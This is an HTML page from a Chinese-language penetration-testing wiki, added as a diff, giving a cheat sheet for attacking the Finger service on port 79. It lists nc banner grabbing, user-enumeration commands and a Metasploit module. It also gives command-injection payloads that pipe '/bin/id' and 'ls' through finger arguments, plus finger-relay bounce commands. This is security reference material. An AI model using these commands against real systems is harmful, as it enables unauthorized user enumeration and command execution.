@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    <link rel="canonical" href="https://nosafe.wiki/Network%20Prot/79%20-%20Finger%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>79 - Finger 渗透测试 - No Safe - 明摆暗卷</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u57fa\u672c\u4fe1\u606f", url: "#_top", children: [
+          ]},
+          {title: "\u5e38\u7528\u7aef\u53e3\uff1a 79", url: "#79", children: [
+          ]},
+          {title: "\u679a\u4e3e", url: "#_2", children: [
+              {title: "Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5", url: "#banner" },
+              {title: "\u7528\u6237\u679a\u4e3e", url: "#_3" },
+              {title: "Metasploit \u4f7f\u7528\u7684\u6280\u5de7\u6bd4 Nmap \u66f4\u591a", url: "#metasploit-nmap" },
+              {title: "Shodan", url: "#shodan" },
+          ]},
+          {title: "\u547d\u4ee4\u6267\u884c", url: "#_4", children: [
+          ]},
+          {title: "Finger \u5f39\u8df3", url: "#finger", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        88 - tcp/udp-kerberos渗透测试
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        69 - udp/tftp渗透测试
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="_1">基本信息</h2>
+<p><strong>Finger</strong> 是一个可以用来查找计算机用户信息的程序。它通常会列出登录名、全名以及关于您正在指向的用户的其他详细信息。这些信息可能包括办公室位置和电话号码（如果已知的话）、登录时间、空闲时间、邮件最后一次读取的时间以及用户的计划和项目文件。</p>
+<h2 id="79">常用端口： 79</h2>
+<pre><code>PORT   STATE SERVICE
+79/tcp open  finger
+</code></pre>
+<h2 id="_2">枚举</h2>
+<h3 id="banner">Banner 抓取/基本连接</h3>
+<pre><code>nc -vn &lt;IP&gt; 79
+echo &quot;root&quot; | nc -vn &lt;IP&gt; 79
+</code></pre>
+<h3 id="_3">用户枚举</h3>
+<pre><code>finger @&lt;Victim&gt;       #列出用户
+finger admin@&lt;Victim&gt;  #获取用户信息
+finger user@&lt;Victim&gt;   #获取用户信息
+</code></pre>
+<p>使用<a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum"><strong>pentestmonkey</strong></a>中的<strong>finger-user-enum</strong>，一些示例：</p>
+<pre><code>finger-user-enum.pl -U users.txt -t 10.0.0.1
+finger-user-enum.pl -u root -t 10.0.0.1
+finger-user-enum.pl -U users.txt -T ips.txt
+</code></pre>
+<h4 id="nmap">Nmap 使用默认脚本执行脚本</h4>
+<h3 id="metasploit-nmap">Metasploit 使用的技巧比 Nmap 更多</h3>
+<pre><code>use auxiliary/scanner/finger/finger_users
+</code></pre>
+<h3 id="shodan">Shodan</h3>
+<ul>
+<li><code>port:79 USER</code></li>
+</ul>
+<h2 id="_4">命令执行</h2>
+<pre><code>finger &quot;|/bin/id@example.com&quot;
+finger &quot;|/bin/ls -a /@example.com&quot;
+</code></pre>
+<h2 id="finger">Finger 弹跳</h2>
+<p><a href="https://securiteam.com/exploits/2BUQ2RFQ0I/">Use a system as a finger relay</a></p>
+<pre><code>finger user@host@victim
+finger @internal@external
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../88-tcp-udp-kerberos%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        88 - tcp/udp-kerberos渗透测试
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../69-udp-tftp%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        69 - udp/tftp渗透测试
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
